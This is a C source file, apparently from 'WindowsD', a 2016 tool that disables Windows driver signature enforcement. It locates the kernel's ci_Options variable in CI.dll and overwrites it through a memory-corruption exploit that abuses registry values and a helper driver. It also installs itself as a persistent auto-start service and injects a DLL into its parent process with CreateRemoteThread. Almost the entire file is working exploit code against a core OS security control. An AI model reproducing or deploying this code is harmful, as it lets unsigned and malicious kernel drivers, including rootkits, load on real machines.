#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>

#include "defs.h"
#include "ntcruft.h"

#include "ioctl.c"

static void *get_res(int id, int *len)
{
	HRSRC h = FindResource(NULL, MAKEINTRESOURCE(id), RT_RCDATA);
	HGLOBAL g = LoadResource(NULL, h);
	*len = SizeofResource(NULL, h);
	return LockResource(g);
}

static void *get_mod_info()
{
	DWORD got = 0;
	void *m;

	NTSTATUS ret = NtQuerySystemInformation(
			SystemModuleInformation, NULL, 0, &got);
	if (ret != STATUS_INFO_LENGTH_MISMATCH)
		return NULL;

	m = malloc(got);
	if (NT_SUCCESS(NtQuerySystemInformation(SystemModuleInformation, m, got, &got)))
		return m;
	free(m);
	return NULL;
}

static ULONG_PTR get_mod_base(RTL_PROCESS_MODULES *m, char *name)
{
	for (int i = 0; i < m->NumberOfModules; i++) {
		RTL_PROCESS_MODULE_INFORMATION *p = m->Modules + i;
		if (!stricmp(name, (char*)p->FullPathName + p->OffsetToFileName))
			return (ULONG_PTR)p->ImageBase;
	}
	return 0;
}

#ifndef _WIN64
// on x86, we dont have the luxury of saving the original ci_Options
// We attempt to guess semi-correct value of the first byte.
// Since x86 has no PatchGuard running (yet?), this needs to be only
// semi-accurate to feign the "secure" kernel status.
static ULONG_PTR guess_ci()
{
	DWORD dw, infoci[2] = { sizeof(infoci) };
	unsigned char infosb[0x18];
	unsigned char infobe[0x20];
	ULONG_PTR ret = 0;
	NTSTATUS status;

	status = NtQuerySystemInformation(SystemCodeIntegrityInformation, &infoci, sizeof(infoci), &dw);
	DBG("QueryCI status %08x", (unsigned)status);
	if (!NT_SUCCESS(status))
		return 0;
	dw = sizeof(infosb);
	status = NtQuerySystemInformation(SystemSecureBootPolicyInformation, &infosb, sizeof(infosb), &dw);
	DBG("QuerySecureBoot status %08x", (int)status);
	if (NT_SUCCESS(status)) {
		dw = sizeof(infobe);
	// 	if ( *(_BYTE *)(v5 + 0x14) & 0x80 )
	// 	{
	//      	LOWORD(v8) = g_CiOptions | 0x20;
	// 		g_CiOptions |= 0x20u;
	// 	}
		status = NtQuerySystemInformation(SystemBootEnvironmentInformation, &infobe, sizeof(infobe), &dw);
		DBG("QueryBootEnv status %08x", (int)status);
		if (NT_SUCCESS(status)) {
			if (infosb[0x14] & 0x80)
				ret |= 0x20;
		}
	}

	DBG("infoci is %d", (int)infoci[1]);
	if (infoci[1] & 1) // enabled
		ret |= 6;
	if (infoci[1] & 2) // testsign
		ret |= 8;

	return ret;
}
#endif

static ULONG_PTR ci_analyze(void *mods, ULONG_PTR *cisave, ULONG_PTR *key)
{
	HMODULE ci = LoadLibraryEx(L"CI.dll",NULL,DONT_RESOLVE_DLL_REFERENCES);
	BYTE *p = (void*)GetProcAddress(ci, "CiInitialize");
	ULONG_PTR mod = (ULONG_PTR)ci;
	ULONG_PTR ret, base = get_mod_base(mods, "CI.DLL");
#if _WIN64
	MEMORY_BASIC_INFORMATION info;
#endif

	if (!p) return 0;
	DBG("analyzing ci, modbase=%p, userbase=%p",(void*)base, (void*)mod);

	// find jmp CipInitialize
	for (int i = 0; i < 100; i++, p++) {
#ifdef _WIN64
		if (!memcmp(p-5, "\x48\x83\xc4\x28\xe9",5))
			goto cipinit_found;

		// call something; pop ebp; jmp CipInitialize
		if (p[-1] == 0xe9 && p[-2] == 0x5d && p[-7] == 0xe8)
			goto cipinit_found;
		// call CipInitialize; pop ebp; ret ..
		if (p[-1] == 0xe8 && p[4] == 0x5d)
			goto cipinit_found;
#endif
	}
	DBG("CipInitialize not found in vicinity");
	return 0;
cipinit_found:
	DBG("CipRef @ %p", p);
	p = p + 4 + *((DWORD*)p);
	DBG("CiInitialize @ %p", p);

	for (int i = 0; i < 100; i++, p++) {
#ifdef _WIN64
		// mov ci_Options, ecx; check the relip points back and close
		if (p[-2] == 0x89 && p[-1] == 0x0d && p[3] == 0xff) {
			ret = (ULONG_PTR)(p + 4) + *((LONG*)p);
			goto found_ci;
		}
#else
		// mov ci_Options, ecx; check the address is within the module
		if (p[-2] == 0x89 && p[-1] == 0x0d)
		{
			DWORD dw = *((DWORD*)p);
			DBG("found mov [%x], ecx", (unsigned)dw);
			if (dw > mod && dw < (mod+1024*1024)) {
				ret = *(ULONG_PTR*)p;
				goto found_ci;
			}
		}
#endif
	}
	DBG("ci_Options not found");
	return 0;
found_ci:
#if _WIN64
	// Scratch space we use to stash original ci_Options into
	if (!VirtualQuery((void*)ret, &info, sizeof(info)))
		return 0;
	DBG("data region %p-%p(%p-%p)",info.BaseAddress,info.BaseAddress+info.RegionSize,
	info.BaseAddress-mod,info.BaseAddress+info.RegionSize-mod);
	*cisave = (ULONG_PTR)((info.BaseAddress + info.RegionSize - 4) - mod + base);
	// Some dummy, unknown key
	p = (void*)mod + 4096;
	while (*((UINT32*)p)>0xff) p++;
	*key = (ULONG_PTR)p - mod + base;
#else
	*cisave = guess_ci();
#endif
	ret = ret - mod + base;
	DBG("done, ci=%p(%p) cisave=%p(%p) key=%p(%p)",
	(void*)ret,(void*)ret-base,(void*)*cisave,(void*)*cisave-base,(void*)*key,(void*)*key-base);
	return ret;
}

static int nt_path(WCHAR *dst, WCHAR *src)
{
	// TBD: something smarter may be needed
	return swprintf(dst, PATH_MAX, L"\\??\\%s", src)*2+2;
}

static int create_service(WCHAR *svc, WCHAR *name, WCHAR *image)
{
	WCHAR tmp[PATH_MAX];
	DWORD dw;
	wcscpy(svc, SVC_BASE);
	if (name) {
		wcscat(svc, name);
	} else {
		int p = wcslen(svc);
		for (WCHAR *i = name = image; *i; i++)
			if (*i == L'\\')
				name = i+1;
		while (*name && *name != '.')
			svc[p++] = *name++;
		svc[p] = 0;
	}

	if (!NT_SUCCESS(RtlCreateRegistryKey(0, svc)))
		return 0;
	RtlWriteRegistryValue(0, svc, L"ImagePath", REG_SZ, tmp, nt_path(tmp, image));
	dw = 1;
	RtlWriteRegistryValue(0,svc, L"Type", REG_DWORD, &dw, sizeof(dw));
	DBG("created service reg=%S, image=%S", svc, image);
	return 1;
}

static void *read_file(WCHAR *path, int *len)
{
	DWORD sz, ret = 0;
	HANDLE f;
	void *buf;
	f = CreateFile(path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	if (f == INVALID_HANDLE_VALUE)
		return 0;
       	sz = GetFileSize(f, NULL);
	if (sz == INVALID_FILE_SIZE)
		return NULL;
	DBG("reading %S, size=%d", path, (int)sz);
	buf = malloc(sz);
	if ((!ReadFile(f, buf, sz, &ret, NULL)) || (sz != ret)) {
		DBG("read failed %d/%d %x",(int)sz,(int)ret,(int)GetLastError());
		CloseHandle(f);
		free(buf);
		return NULL;
	}
	CloseHandle(f);
	*len = sz;
	return buf;
}

static int update_file(WCHAR *fullpath, WCHAR *name, int res)
{
	DWORD sz;
	WCHAR tmp[PATH_MAX];
	HANDLE f;
	int needmove = 0;
	int elen, len, ret = 0;
	void *ebuf, *buf;

	DBG("updating file %S, rsrc=%d", name, res);
       
	if (res < 0) {
		if (!GetModuleFileName(NULL, tmp, PATH_MAX))
			return 0;
		DBG("got self %S",tmp);
		buf = read_file(tmp, &len);
	} else buf = get_res(res, &len);

	if (!buf) {
		DBG("failed to get update buffer data");
		return 0;
	}

	wcscpy(fullpath + GetSystemDirectory(fullpath, PATH_MAX), name);
	sz = GetFileSize(fullpath, NULL);
	DBG("got fullpath %S", fullpath);

	ebuf = read_file(fullpath, &elen);
	if (ebuf) {
		if ((elen == len) && (!memcmp(ebuf, buf, len))) {
			ret = 1;
			DBG("files equal, skip");
			goto out;
		}
		DBG("file nonequal? %d %d", elen,len);
	}

	f = CreateFile(fullpath, FILE_WRITE_DATA,
		FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0);
	DBG("create %p",f);
	if (f == INVALID_HANDLE_VALUE) {
		swprintf(tmp, PATH_MAX, L"%s.new", fullpath);
		f = CreateFile(tmp, FILE_WRITE_DATA,
			FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0);
		if (f == INVALID_HANDLE_VALUE)
			goto out;
		needmove = 1;
	}

	sz = 0;
	ret = WriteFile(f, buf, len, &sz, NULL);
	CloseHandle(f);
	if (!ret || sz != len) {
		DeleteFile(needmove?tmp:fullpath);
		goto out;
	}
	if (needmove) {
		DBG("Will move from %S to %S on next boot", tmp, fullpath);
		ret = MoveFileEx(tmp, fullpath, MOVEFILE_DELAY_UNTIL_REBOOT|MOVEFILE_REPLACE_EXISTING);
		if (!ret) DeleteFile(tmp);
	}
	DBG("ret done %d",ret);
out:;
    	if (ebuf)
		free(ebuf);
	if (res < 0)
		free(buf);
	return ret;
}

static int install_files(WCHAR *svc, WCHAR *ldr)
{
	WCHAR dllpath[PATH_MAX];
	WCHAR syspath[PATH_MAX];
	WCHAR ldrpath[PATH_MAX];

	if (!update_file(dllpath, L"\\" BASENAME ".exe", -1))
		return 0;
	if (!update_file(dllpath, L"\\" BASENAME ".dll", DLL_ID))
		return 0;
	if (!update_file(syspath, L"\\drivers\\" BASENAME ".sys", SYS_ID))
		return 0;
	if (!update_file(ldrpath, L"\\drivers\\" BASENAME "loader.sys", LOADER_ID))
		return 0;

	if (!create_service(svc, NULL, syspath))
		return 0;
	if (!create_service(ldr, NULL, ldrpath))
		return 0;

	return 1;
}

static HANDLE trigger_loader(WCHAR *svc, WCHAR *ldr)
{
        ULONG_PTR cisave = 0, key = 0;
        void *mod = get_mod_info();
	ULONG_PTR ci = ci_analyze(mod, &cisave, &key);

#ifdef _WIN64
	struct {
		UINT64 pad;
		RTL_QUERY_REGISTRY_TABLE tab[4] ;
	} buffer = { .tab = {
	{}, {}, // skip 2 entries
	{ // save original ci_Options byte to cisave
		.Flags = 32, // DIRECT
		.Name = (void*)key, // valid string, but non-existent key
		.EntryContext = (void*)cisave, // destination
		.DefaultType = REG_DWORD,
		.DefaultData = (void*)ci, // source
		.DefaultLength = 1 // save 1 byte
	},
	{ // overwrite ci_Options byte with 0
		.Flags = 32, // DIRECT
		.Name = (void*)key, // valid string, but non-existent key
		.EntryContext = (void*)ci, // data to overwrite
		.DefaultType = REG_DWORD,
		.DefaultData = (void*)key + 2, // source - 4 zeros
		.DefaultLength = 1 // overwrite 1 byte
	}
}};
	RtlWriteRegistryValue(0, ldr, L"FlowControlDisable", REG_SZ, L"x", 4);
#else
	// smash 4 stack DWORD entries
	RtlWriteRegistryValue(0, ldr, L"FlowControlDisable", REG_MULTI_SZ, L"x\0x\0", 10);
	// target addr
	RtlWriteRegistryValue(0, ldr, L"FlowControlDisplayBandwidth", REG_DWORD, &ci, 4);
	// and write 0 byte there
	DWORD zero = 0;
	RtlWriteRegistryValue(0, ldr, L"FlowControlChannelBandwidth", REG_SZ, &zero, 1);

#endif
	NTSTATUS status;
	HANDLE dev;
	UNICODE_STRING svcu, ldru;

        if (!ci)
		return 0;

	RtlInitUnicodeString(&svcu, svc);
	RtlInitUnicodeString(&ldru, ldr);

	for (int i = 0; 1; i++) {
		// try to load our driver if loader suceeded
		status = NtLoadDriver(&svcu);
		(void)status;
		DBG("NtLoadDriver(%S) = %08x", svcu.Buffer, (unsigned)status);
		dev = ioctl_open();
		DBG("devopen=%p",dev);
		// if that succeeds, fine
		if (dev) {
			DBG("doing setup");
			// we're in, quick, restore context
			ioctl_setup(dev, ci, cisave);
		}
		// remove loader, if nay
		status = NtUnloadDriver(&ldru);
		DBG("NtUnloadDriver(%S) = %08x", ldru.Buffer, (unsigned)status);
		// exit if we're in
		if (dev)
			break;
		if (i  > LOAD_ATTEMPTS)
			break;
#ifdef _WIN64
		// on win64, there are 2 stack align variants, depending
		// if REG_BINARY is negative or not.
		if (i&1) {
			RtlWriteRegistryValue(0, ldr, L"FlowControlDisplayBandwidth",REG_BINARY,
					((void*)buffer.tab)-4, sizeof(buffer.tab)+4);
		} else {
			RtlWriteRegistryValue(0, ldr, L"FlowControlDisplayBandwidth", REG_BINARY,
					((void*)buffer.tab)+4, sizeof(buffer.tab)-4);
		}
#endif
		// request loader driver again
		status = NtLoadDriver(&ldru);
		DBG("NtLoadDriver(%S) = %08x", ldru.Buffer, (unsigned)status);
	}
	return dev;
}

static HANDLE check_driver(int force)
{
	HANDLE dev;
	dev = ioctl_open();
	if (!dev || force) {
		HANDLE hmutex;
		WCHAR svc[PATH_MAX], ldr[PATH_MAX];

		hmutex = CreateMutex(NULL, 0, L"mutex"BASENAME);
		WaitForSingleObject(hmutex,INFINITE);

		if (install_files(svc, ldr))
			dev = trigger_loader(svc, ldr);

		ReleaseMutex(hmutex);
		CloseHandle(hmutex);
	}
	return dev;
}

static int elevate()
{
	BOOLEAN old;
	return NT_SUCCESS(RtlAdjustPrivilege(ID_SeLoadDriverPrivilege, 1, 0, &old));
}

static int load_driver(WCHAR *name)
{
	WCHAR svc[PATH_MAX];
	NTSTATUS status;
	HANDLE dev;
	int ret = 0;

	if (!elevate()) {
		printf("You need to run this command as an Administrator.\n");
		return 0;
	}

       	dev = check_driver(0);
	if (!name) {
		ret = !!dev;
		goto outclose;
	}

	if (!dev) {
		printf("Control driver failed to load. Use debug binary for details.\n");
		goto outclose;
	}

	while (*name == L' ' || *name == L'\t') name++;

	if (!*name) {
		ret = 1;
		printf("Control driver loaded.\n");
		goto outclose;
	}

	// create service?
	for (int i = 0; name[i]; i++) {
		if (name[i] == L'.') {
			WCHAR fullpath[PATH_MAX];
			GetFullPathName(name, PATH_MAX, fullpath, NULL);
			if (!create_service(svc, NULL, fullpath)) {
				printf("Failed to create service for file %S", fullpath);
				goto outclose;
			}
			goto havesvc;
		}
	}
	wcscpy(svc, SVC_BASE);
	wcscat(svc, name);
havesvc:;
	status = ioctl_insmod(dev, svc);
	if (!NT_SUCCESS(status)) {
		printf("Failed to load %S NTSTATUS=%08x", name, (int)status);
		goto outclose;
	}
	printf("%S loaded.", name);
	ret = 1;
outclose:;
	ioctl_close(dev);
	return ret;
}

static int restore_point(char *name)
{
	SHELLEXECUTEINFOA shexec = {
		.cbSize = sizeof(shexec),
		.fMask = SEE_MASK_NOCLOSEPROCESS,
		.lpVerb = "open",
		.lpFile = FILE_VBS,
		.lpParameters = "",
	};
	HMODULE lib = LoadLibraryA("SHELL32");
	BOOL (WINAPI *sh)(VOID*) = (void*)GetProcAddress(lib, "ShellExecuteExA");
	DWORD ecode = 1;
	FILE *f;
	// we can be called before desktop is available, user32.dll could fail
       	if (!sh)
		return 0;
	f = fopen(FILE_VBS, "w+");
	fprintf(f, RESTORE_VBS, name);
	fclose(f);
	if (!sh(&shexec))
		return 0;
	printf("Creating restore point..."); fflush(stdout);
	WaitForSingleObject(shexec.hProcess,INFINITE);
	GetExitCodeProcess(shexec.hProcess, &ecode);
	DeleteFileA(FILE_VBS);
	return ecode == 123;
}

static int do_install()
{
	WCHAR path[PATH_MAX];
	SC_HANDLE h, scm;
	int ret = 0;
	NTSTATUS st;

	DBG("doing install");

	if (!elevate()) {
		printf("You need to run this command as an Administrator.\n");
		return 0;
	}
	st = NtUnloadDriver(&RTL_STRING(SVC_BASE BASENAME));
	(void)st;
	DBG("Unloading previous driver %x", (int)st);

	if (!check_driver(1)) {
		printf("Failed to initialize driver.\n");
		DBG("no driver, exiting");
		return 0;
	}

	scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!scm) {
		printf("Unable to initialize boot service.\n");
		return 0;
	}
	wcscpy(path + GetSystemDirectory(path, PATH_MAX), L"\\" BASENAME ".exe /X");
	DBG("injector=%S",path);

	h = CreateService(scm, L"" BASENAME"inject", L""BASENAME" injector service", SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
		path, L"Base", NULL, NULL, NULL, NULL);
	if (!h && (GetLastError() == ERROR_SERVICE_EXISTS)) {
		h = OpenService(scm, L""BASENAME"inject", SERVICE_ALL_ACCESS);
	}
	if (h) {
		ret = 1;
		StartService(h, 0, NULL);
	}
	if (ret) {
		printf(BASENAME " installed successfuly.\n");
	} else {
		printf(BASENAME " installation failed. Use debug version to find out why.\n");
	}
	CloseServiceHandle(h);
	CloseServiceHandle(scm);
	return ret;
}

static int do_uninstall(int checkonly)
{
	HANDLE h, scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	int ret = 0;
	if (!scm) return 0;
	h = OpenService(scm, L""BASENAME"inject", SERVICE_ALL_ACCESS);
	if (!h)
		goto out;
	if (checkonly)
		ret = 1;
	else
		ret = DeleteService(h);
	CloseServiceHandle(h);
out:;
	CloseServiceHandle(scm);
	if (!checkonly) {
		NTSTATUS st = NtUnloadDriver(&RTL_STRING(SVC_BASE BASENAME));
		(void)st;
		DBG("Unloading previous driver %x", (int)st);
	}
	if (ret) {
		printf(BASENAME " uninstalled.\n");
	} else {
		printf("Some errors during uninstallation (already uninstalled?)\n");
	}
	return ret;
}

static int is_installed()
{
	return do_uninstall(1);
}


static int yesno(char *q)
{
	char c;
	do {
		printf(">> %s [y/n]", q);
		c = getchar();
		while (getchar() != '\n');
	} while (tolower(c) != 'y' && tolower(c) != 'n');
	return c == 'y';
}

static int interactive_install()
{
	printf("We're going to patch deep into windows and something may go awry.\n"
		"The changes can be reversed by restoring registry (part of restore).\n"
		"Creating a backup you can boot into is STRONGLY advised.\n");
	if (!yesno("Create a system restore point?"))
		return 1;
	if (!restore_point("Before installing " BASENAME)) {
		printf("Restore point creation failed!\n"
			"Create restore point manualy NOW and then proceed!\n");
		return yesno("Do you want to proceed with installation?");
	} else printf("Done!\n");
	return 1;
}

static int usage(int interactive)
{
	int doit, installed = is_installed();

	for (int n = printf( "WindowsD "VERSTR" kat@lua.cz 2016\n")-1; n; n--)
		putchar('=');
	putchar('\n');


	printf( "This program disables driver signing policy (DSE).\n"
		"Either per driver-load, or permanently (loaded at system start).\n\n");

	if (!interactive) {
		printf("usage: \n"
" "BASENAME " /I                        install, disable DSE permanently\n"
" "BASENAME " /U                        uninstall, re-enable DSE permanently\n"
" "BASENAME " /W                        run interactive installer\n"
" "BASENAME " /L [service|driver.sys]   load unsigned driver and keep DSE status intact\n");
		goto out;
	}

	printf("Entering interactive mode (invoke " BASENAME " /? for cmd options)\n\n");
	if (installed) {
		printf("Detected running " BASENAME ".\n");
		doit = yesno("Do you wish to uninstall it?");
	} else {
		printf(BASENAME " is not installed. Unsigned drivers will not load at boot.\n");
		doit = yesno("Do you wish to install it system-wide?");
	}

	if (doit) {
		int ret;
		if (installed)
			ret = do_uninstall(0);
		else {
			if (!interactive_install())
				goto cancel;
			ret = do_install();
		}
		printf("All done! Press enter to close...");
		getchar();
		ExitProcess(ret);
	}
cancel:;
	printf("Operation cancelled, press enter to close...");
	getchar();
out:;
	ExitProcess(1);
}

static void WINAPI service_ctl(DWORD code)
{
}

static void inject_parent(int pid)
{
	char path[PATH_MAX];
	HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
	void *lla, *dst;
	dst = VirtualAllocEx(hp, NULL, 4096, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);

	strcpy(path + GetSystemDirectoryA(path,PATH_MAX), "\\" BASENAME ".dll");

	DBG("injecting into parent pid=%d h=%p dst=%p path=%s",(int)pid,hp,dst,path);

	if (!WriteProcessMemory(hp, dst, path, strlen(path) + 1, NULL)) {
		DBG("writing memory failed");
		goto out;
	}

	lla = GetProcAddress(GetModuleHandleA("KERNEL32.DLL"),"LoadLibraryA");
	if (!lla) {
		DBG("failed to get LoadLibraryA");
		goto out;
	}
	CreateRemoteThread(hp, NULL, 0, lla, dst, 0, NULL);
out:;
	CloseHandle(hp);
}

static void fix_boot_drivers()
{
	SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	DWORD nserv, sz = 0;
	ENUM_SERVICE_STATUS_PROCESS *buf;
	QUERY_SERVICE_CONFIG *cfg = NULL;
	DWORD cfgsz = 0;

	if (!scm) return;

	EnumServicesStatusEx(scm, SC_ENUM_PROCESS_INFO, SERVICE_DRIVER,
			SERVICE_INACTIVE, NULL, 0, &sz,
			&nserv, NULL, NULL);

	if (!sz) goto outclose;
	buf = malloc(sz);

	if (!EnumServicesStatusEx(scm, SC_ENUM_PROCESS_INFO, SERVICE_DRIVER,
			SERVICE_INACTIVE, (void*)buf, sz, &sz,
			&nserv, NULL, NULL))
		goto outfree;

	DBG("got %d services", (int)nserv);
	for (int i = 0; i < nserv; i++) {
		SERVICE_STATUS_PROCESS *stat = &buf[i].ServiceStatusProcess;
		SC_HANDLE sc;
		if (stat->dwServiceType > 3) continue;
		sc = OpenService(scm, buf[i].lpServiceName, SERVICE_ALL_ACCESS);
retry:;
		if (!QueryServiceConfig(sc, cfg, cfgsz, &cfgsz)) {
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
				cfg = realloc(cfg, cfgsz);
				goto retry;
			}
			CloseServiceHandle(sc);
			continue;
		}
		if (cfg->dwStartType > 1) {
			CloseServiceHandle(sc);
			continue;
		}
		DBG("found stale boot service %S, starting",buf[i].lpServiceName);
		StartService(sc, 0, NULL);
		CloseServiceHandle(sc);
	}
	free(cfg);
outfree:;
	free(buf);
outclose:;
	CloseServiceHandle(scm);
}

static void WINAPI service_main(DWORD argc, WCHAR **argv)
{
	SERVICE_STATUS_HANDLE svc = RegisterServiceCtrlHandler(L""BASENAME, service_ctl);
	SERVICE_STATUS st = {
		.dwServiceType = SERVICE_WIN32_OWN_PROCESS,
		.dwCurrentState = SERVICE_START_PENDING
	};
	ULONG_PTR pbi[6];
	ULONG uls;
	SetServiceStatus(svc, &st);

	load_driver(NULL);

	if (NT_SUCCESS(NtQueryInformationProcess(GetCurrentProcess(), 0, &pbi, sizeof(pbi), &uls)))
		inject_parent(pbi[5]);

	fix_boot_drivers();

	st.dwCheckPoint++;
	st.dwCurrentState = SERVICE_STOPPED;
	st.dwWin32ExitCode = 0;
	SetServiceStatus(svc, &st);
}

static int run_service()
{
	SERVICE_TABLE_ENTRY s_table[] =  {
		{L""BASENAME"inject", service_main},
		{NULL, NULL}
	};
	if (!StartServiceCtrlDispatcher(s_table))
		return 0;
	return 1;
}

void ENTRY(win_main)()
{
	int ret = 0;
	CONSOLE_SCREEN_BUFFER_INFO csbi;
	int explorer = GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbi)
		&& !(csbi.dwCursorPosition.X|csbi.dwCursorPosition.Y);

	WCHAR *cmd = GetCommandLine();
	int quot = *cmd++ == L'"';
	while (*cmd && (quot || (cmd[0]>L' ')))
		if (*cmd++ == L'"')
			quot ^= 1;
	while (*cmd && *cmd<= L' ')
		cmd++;

	if ((*cmd != L'/') && (*cmd != L'-'))
		usage(explorer);
	cmd += 2;

	switch (toupper(cmd[-1])) {
		case 'I':
			ret = !!do_install();
			break;
		case 'U':
			ret = !!do_uninstall(0);
			break;
		case 'W':
			usage(1);
			break;
		case 'L':
			ret = !!load_driver(cmd);
			break;
		case 'X':
			ret = !!run_service();
		default:
			usage(0);
	}

	ExitProcess(ret);
}
